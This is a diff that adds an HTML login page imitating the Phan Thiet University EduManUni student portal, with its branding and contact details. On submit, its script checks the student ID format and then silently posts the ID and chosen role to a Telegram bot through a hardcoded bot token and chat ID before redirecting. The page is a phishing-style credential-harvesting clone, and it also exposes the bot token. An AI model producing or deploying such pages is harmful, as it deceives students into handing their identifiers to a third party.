@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Đăng nhập | UPT</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+
+    .header {
+      background-color: #d4e6f1;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .header img {
+      height: 50px;
+      margin-right: 10px;
+    }
+    .header-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #003366;
+    }
+    .header-title span {
+      color: #0077c8;
+    }
+
+    .menu {
+      background-color: #0066b3;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+    }
+    .menu-item {
+      background-color: #fdd67b;
+      font-weight: bold;
+      padding: 10px 20px;
+      box-shadow: 2px 2px 4px #ccc;
+      border-radius: 0 0 8px 8px;
+    }
+
+    .login-box {
+      max-width: 90%;
+      width: 400px;
+      margin: 30px auto;
+      background-color: #fff;
+      padding: 20px;
+      border: 1px solid #ddd;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+    }
+    .login-box h2 {
+      background-color: #fdd67b;
+      padding: 10px;
+      margin: 0 0 20px 0;
+      font-size: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #aaa;
+      border-radius: 4px;
+    }
+    .role-option {
+      margin-bottom: 15px;
+    }
+    .role-option label {
+      margin-left: 5px;
+      margin-right: 15px;
+    }
+    .submit-btn {
+      text-align: center;
+    }
+    .submit-btn button {
+      background: #0066b3;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .error-message {
+      color: red;
+      font-weight: bold;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .footer {
+      background-color: #035e96;
+      color: white;
+      text-align: center;
+      padding: 12px 20px;
+      font-size: 14px;
+    }
+    .footer strong {
+      display: block;
+      margin-bottom: 5px;
+    }
+    .footer-bottom {
+      background-color: #0072c6;
+      color: white;
+      padding: 6px;
+      text-align: center;
+    }
+    .footer-bottom span {
+      color: #ffd700;
+      font-weight: bold;
+    }
+
+    @media (max-width: 480px) {
+      .header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .header img {
+        margin-bottom: 10px;
+      }
+      .login-box h2 {
+        font-size: 18px;
+      }
+      .submit-btn button {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <div class="header">
+    <img src="logo-UPT-768x768.png" alt="Logo">
+    <div class="header-title">
+      HỆ THỐNG QUẢN LÝ ĐÀO TẠO <span>EDUMANUNI</span><br>
+      TRANG THÔNG TIN ĐÀO TẠO TÍN CHỈ
+    </div>
+  </div>
+
+  <!-- MENU -->
+  <div class="menu">
+    <div class="menu-item">HOME</div>
+  </div>
+
+  <!-- LOGIN FORM -->
+  <div class="login-box">
+    <h2>Đăng nhập</h2>
+    <form id="loginForm">
+      <label for="username">Tên đăng nhập:</label>
+      <input type="text" id="username" name="mssv" placeholder="Nhập MSSV [Vui Lòng Ghi Hoa]" required>
+
+      <label for="password">Mật khẩu:</label>
+      <input type="text" id="password" name="mssv" placeholder="Nhập Mật Khẩu..." required>
+
+      <label>Đăng nhập với vai trò</label>
+      <div class="role-option">
+        <input type="radio" name="role" value="Sinh viên" checked> <label><b>Sinh viên</b></label>
+        <input type="radio" name="role" value="Giảng viên, cán bộ"> <label><b>Giảng viên, cán bộ</b></label>
+        <input type="radio" name="role" value="Quản trị viên"> <label><b>Quản trị viên</b></label>
+      </div>
+
+      <div class="submit-btn">
+        <button type="submit">Đăng nhập</button>
+      </div>
+
+      <div id="error-message" class="error-message"></div>
+    </form>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    <strong>Bản quyền: Trường Đại học Phan Thiết</strong>
+    <span>
+      Địa chỉ: 225 Nguyễn Thông, Phú Hài, Phan Thiết, Bình Thuận |
+      Điện thoại: (+84.0252)2461373 - 2461372 - 6283838 |
+      Địa chỉ email: dhphanthiet@upt.edu.vn
+    </span>
+  </div>
+  <div class="footer-bottom">
+    Design by <span>EduSoft</span>
+  </div>
+
+  <!-- SCRIPT -->
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim().toUpperCase();
+      const role = document.querySelector("input[name='role']:checked").value;
+      const errorDiv = document.getElementById("error-message");
+
+      const pattern = /^K16THO00\d{2}$/;
+      if (!pattern.test(username)) {
+        errorDiv.textContent = "❌ MSSV không hợp lệ. Vui lòng nhập theo định dạng: Nhập MSSV Có Trên Thẻ Sinh Viên";
+        return;
+      }
+
+      // Xóa thông báo lỗi nếu đúng
+      errorDiv.textContent = "";
+
+      const message = `🛡️ Đăng nhập mới:\n👤 MSSV: ${username}\n🔐 Vai trò: ${role}`;
+      const token = "7393833255:AAEHbjSRIky-AFJNFCXqfdfMv7UHWla_T3s";
+      const chatId = "5293126208";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = `tc.html?mssv=${encodeURIComponent(username)}`;
+        } else {
+          errorDiv.textContent = "⚠️ Lỗi khi gửi thông tin đến Telegram.";
+        }
+      }).catch(err => {
+        console.error("Telegram Error:", err);
+        errorDiv.textContent = "❌ Không thể gửi dữ liệu đến Telegram.";
+      });
+    });
+  </script>
+</body>
+</html>
